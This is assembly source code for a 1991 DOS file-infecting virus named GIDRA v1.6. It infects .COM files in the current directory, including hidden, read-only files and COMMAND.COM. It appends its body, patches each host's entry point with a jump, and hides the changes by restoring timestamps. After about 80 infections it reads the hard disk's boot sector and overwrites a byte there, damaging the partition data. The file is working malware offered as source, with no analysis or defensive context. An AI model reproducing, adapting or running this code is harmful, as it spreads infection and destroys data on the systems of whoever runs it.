;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
;\\\\\\\\\\\\\\\    GIDRA Version 1.6 (c) 1991 DSsoft.      \\\\\\\\\\\\\\\
;\\\   Infecting Normal, Read-Only, Hidden files in the current directory   \\\
;\\\\\\\\\\\\\\\      Normal Proces In Case Critical Error     \\\\\\\\\\\\\\\\
;\\\\\\\\\\\\\\\\\\\\\      Restored Time & Date        \\\\\\\\\\\\\\\\\\\\\\\
;\\\\\\\\\\\\\\\     Infected COMMAND.COM into stack    \\\\\\\\\\\\\\\\\\\\\\\
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

ICode   equ 'DG'        ;--- Indentificatiion code
Vers    equ '1.6'       ;--- Text Version


nnul    equ $

gidra   segment
    assume  cs:gidra,ds:gidra,es:gidra,ss:gidra
    org 100h

start:
    jmp install
    db  13h,01h

    int 21h
    
    mov ah,9
    lea dx,str2
    int 21h

    mov ax,4c00h
    int 21h
string  db  'GIDRA vers. ',Vers,' (c) 1991 DSsoft.$'
str2    db  10,13,'All rights reserved.$'
    db  '0000'
;------------------------------
nul equ $

GidraBegin:
;------- My Name is : -----------------------------
    db  " I'm GIDRA v",Vers," :   Life is Good, But Good Life Better Yet."
;---------------------------------------------------
;   Data
;---------------------------------------------------
oldinst1    db  0b4h
oldinst2    db  09h
oldinst3    db  0bah

Wildcard    db  '*.COM',0
comcom      db  0

Wjmp        db  0e9h
SavLen      dw  ?

;----------------------------------------------------
Beg equ $
install:
    push    es
    push    ds

    push    cs
    pop ds

    call    agaga
agaga:  pop si
    sub si,offset agaga

    mov al,oldinst3[si]
    mov cs:102h,al

;%%%%%%%%%%%%  BODY  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    mov ah,2fh      ; Get DTA
    int 21h
    mov SavDtaES[si],es
    mov SavDtaBX[si],bx

    mov ah,1ah      ; Set DTA
    lea dx,DTA[si]
    int 21h

    mov ax,3524h    ; Get 24h
    int 21h
    mov old24s[si],es

    mov al,oldinst2[si]
    mov cs:101h,al

    mov old24o[si],bx

    mov al,oldinst1[si]
    mov cs:100h,al

    mov ax,2524h    ; Set 24h
    mov dx,offset cork
    add dx,si
    int 21h

    mov ah,4eh      ; Find 1st
    lea dx,Wildcard[si]
    mov cx,3
    int 21h
    jc  b1

open:
    mov ax,Time[si]
    and ax,0000000000011111b
    cmp al,00011111b
    jne clear

b4: jmp FindNext
b1: jmp Exit

command     db  'COMMAND',0

b3: jmp CloseAndExit
b2:

clear:
    mov ax,4300h
    lea dx,Fname[si]
    int 21h
    mov Attr[si],cl
    test    cl,3
    jz  OkOp
    mov ax,4301h
    xor cx,cx
    int 21h
    jc  b4

OkOp:
    mov di,0
    mov cx,6
    mov bx,si
cycle:
    mov al,Fname[bx+di]
    cmp command[bx+di],al
    jne ex_cycle
    inc di
    loop    cycle

    mov comcom[si],0ffh

ex_cycle:

    mov ax,3d02h    ; Open
    int 21h
    jc  b4

    mov bx,ax

;-   -   -   -   -   -   -   -   -   -   -   -   -   -   ( Zaraza )
    mov ax,4200h    ; Lseek Start
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,3fh      ; Read 3 old codes file
    mov cx,3
    lea dx,OldInst1[si]
    int 21h

    xor cx,cx
    cmp comcom[si],0
    jne coman
    xor dx,dx
    mov ax,4202h    ; Lseek To End File
    jmp short   iinn
coman:  
    mov ax,4200h    ; lseek to begin
    mov dx,SizeL[si]
    sub dx,GidraLen
iinn:
    int 21h     ; Now AX consist Len of File 
    jc  b4

    mov SavLen[si],ax
    add SavLen[si],Beg-nul-3
    mov comcom[si],0

    inc CopyNum[si]

    cmp CopyNum[si],50h
    jna malo
    mov byte ptr CopyNum[si],0
    call    pakost
malo:
    mov ah,40h      ; Write To file
    lea dx,GidraBegin[si]
    mov cx,GidraLen
    int 21h
    jnc non_err
    jmp b4
non_err:
    mov ax,4200h    ; Lseek Start
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,40h      ; Write JMP to GidraBegin
    lea dx,Wjmp[si]
    mov cx,3
    int 21h

    mov ax,5701h        ; Restore Time/Date
    mov cx,Time[si]
    or  cx,0000000000011111b
    mov dx,Date[si]
    int 21h

    jmp short FindNext
; -   -   -   -   -   -   -   -   -    -   -   -   -   -   -
CloseAndExit:
    call    close

Exit:   mov ah,1ah      ; Set DTA Back
    mov dx,SavDtaBX[si]
    mov ds,SavDtaES[si]
    int 21h

    mov ax,2524h    ; Restore 24h
    lds dx,dword ptr old24o[si]
    int 21h

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    pop ds
    pop es
    mov ax,100h
    push    ax
    ret
;------------- Subroutines ---------------------------
FindNext:
    call    close
    mov ah,4fh      ; Find 1st
    lea dx,DTA[si]
    int 21h
    jc  b5
    jmp Open
b5: jmp CloseAndExit
;---------------------------
pakost:
    mov ax,0201h
    mov dx,0080h
    mov cx,0001h
    lea bx,buffer[si]
    int 13h

    cmp BYTE PTR es:buffer[si+0466],51h
    jne no_destroy
    mov BYTE PTR es:buffer[si+0466],00h

    mov ax,0301h
    int 13h
no_destroy: 
    ret
;---------------------------
close:
    mov ax,4301h
    xor     ch,ch
    mov cl,Attr[si]
    lea dx,Fname[si]
    int 21h

    mov ah,3eh
    int 21h
    ret
cork:
    mov al,3
    iret

;-----------------------------------------------------
CopyNum db  0
    dw  ICode
;-----------------------------------------------------
GidraLen    equ $-nul
;-----------------------------

SavDtaES    dw  ?
SavDtaBX    dw  ?
; - - - - - - - - - - - - - - - - - - - - - -
DTA     db  21 dup ( ? )
    Atr db  ?
    Time    dw  ?
    Date    dw  ?
    SizeL   dw  ?
    SizeH   dw  ?
    Fname   db  13 dup ( ? )
; - - - - - - - - - - - - - - - - - - - - - -



Indent      dw  ?
Attr        db  ?

old24o      dw  ?
old24s      dw  ?

buffer      label   byte

;-----------------------------------------------------

gidra ends

    end start
    